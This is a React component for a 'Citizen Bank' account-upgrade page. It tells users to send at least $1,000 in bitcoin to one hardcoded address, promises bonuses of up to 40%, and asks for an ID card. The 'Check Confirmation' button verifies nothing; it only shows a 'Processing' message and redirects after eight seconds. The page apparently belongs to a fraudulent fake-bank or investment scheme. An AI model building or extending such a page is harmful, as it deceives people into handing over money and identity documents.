import React from "react";
import { useState } from "react";
import { Button } from "react-bootstrap";
import NavBarLoggedIn from "./NavBarLoggedIn";
import btcqr from "../assets/pluto.jpg";
import { useNavigate } from 'react-router-dom';
import { Modal } from "react-bootstrap";
import "../styles/kycStyles.css";

const KycUpgrade = () => {
    const navigate = useNavigate();

    const [showModal, setShowModal] = useState(false);

    const handleCloseModal = () => setShowModal(false);
  	const handleShowModal = () => setShowModal(true);
    const [copySuccess, setCopySuccess] = useState(false);

  // Function to handle the click-to-copy
  const handleCopyClick = () => {
    const btcAddress = "17HTyVURbc4zx1BryCZYLqiAa6YPXv3P8A";
    navigator.clipboard.writeText(btcAddress).then(
      () => {
        setCopySuccess(true);
        // Reset the copy success message after 3 seconds
        setTimeout(() => setCopySuccess(false), 3000);
      },
      (err) => {
        console.error("Failed to copy: ", err);
      }
    );
  };

    const profile = () => {

        navigate('/profile')

    }

    const handleTopUpClick = () => {
      // Create a bitcoin URI with the recipient address
      const bitcoinURI = `bitcoin:17HTyVURbc4zx1BryCZYLqiAa6YPXv3P8A`;
  
      // Open the bitcoin URI in a new window
      window.open(bitcoinURI);
    };

    const confirmation = () => {
        handleShowModal();
        setTimeout(() => {
            navigate("/dashboard");
          }, 8000);

    }

  return (
    <div>
    <NavBarLoggedIn />

    <div className="container">
      <div className="row">
        <div className="col-md-12 col-sm-12 col-lg-12">
          <div className="panel panel-default">
            <h3 style={{color: "#821a1b", marginBottom: "20px"}}><strong>Top Up to Upgrade Your Account</strong></h3>
            <div className="panel-body">
              <h4>Send Money to Your Unique Address Below to Top Up Your Account</h4>
              <hr />
              <p style={{fontSize: "12px", color: "#F70002"}}><i>Minimum TOPUP is $1,000 USD *</i></p>
              <hr />
              <div className="row">
                <div className="modal-header">
                  <h4 id="myModalLabel" className="modal-title">
                    Payment Method: <strong>BTC</strong>
                  </h4>
                  <br />
                  <Button style={{backgroundColor: "#d6d6d6", border: "0px"}}>
                    (1-3 Confirmation required)
                  </Button>
                </div>
                <div className="modal-body">
                  <div className="col-md-6">
                  <h4><strong>Bonus Information</strong></h4>
                    <p style={{fontSize: "15px"}}>More than 1000$+ top-up, you will get 15% bonus!</p>
                    <p style={{fontSize: "15px"}}>More than 2000$+ top-up, you will get 30% bonus!</p>
                    <p style={{fontSize: "15px"}}>More than 5000$+ top-up, you will get 40% bonus!</p>
                    <p style={{color: "#821a1b", marginTop: "30px", fontSize: "15px"}}><strong>* Add your ID card to profile to complete the KYC upgrade</strong></p>
                    
                    <hr />
                    <h3><strong>1 BTC = 27688.64 USD</strong></h3>
                    <hr />
                  </div>
                  <div className="col-md-6">
                    <h4>Scan to Send your bitcoin using QR Code </h4>
                    <hr />
                    
                    <img src={btcqr} alt="btcqr" className="btcqr" />
                
                    <hr />
                    <h4>Or copy this unique address:</h4>
                    <div id="BTC-address" onClick={handleCopyClick} className="alert alert-block alert-success" style={{fontSize: "17px", justifyContent: "center"}}>
                    17HTyVURbc4zx1BryCZYLqiAa6YPXv3P8A
                    </div>
                    {/* Show the copy success message */}
                    {copySuccess && <p style={{ color: "green", fontSize: "15px" }}>Address copied to clipboard!</p>}
                    <hr />
                    <h4>And click  to pay:</h4>
                    <Button onClick={handleTopUpClick} style={{backgroundColor: "#821a1b", border: "0px"}}>
                      Top Up
                    </Button>
                    <div className="col-md-3"></div>
                  </div>
                </div>
              </div>
              <hr />
              <Button onClick={confirmation} style={{backgroundColor: "#821a1b", border: "0px", width: "100%"}}>
                      Check Confirmation
              </Button>
              <hr />
            </div>
          </div>
        </div>
      </div>
    </div>
    <h6 style={{ textAlign: "center", marginTop: "30px" }}>Copyright © 2023 Citizen Bank, All rights reserved.</h6>

    {/* Modal */}
    <Modal show={showModal} onHide={handleCloseModal} centered // Center the modal vertically
    className="modal-dialog-responsive">
    <Modal.Header closeButton>
      <Modal.Title>Processing...</Modal.Title>
    </Modal.Header>
    <Modal.Body>
      Confimation takes atleast 24 - 72 hours. Check Dashboard for Activation.
    </Modal.Body>
    <Modal.Footer>
      <Button variant="primary" onClick={handleCloseModal} style={{ backgroundColor: "#821a1b" }}>
        OK
      </Button>
    </Modal.Footer>
  </Modal>
    </div>
    

  );
};

export default KycUpgrade;
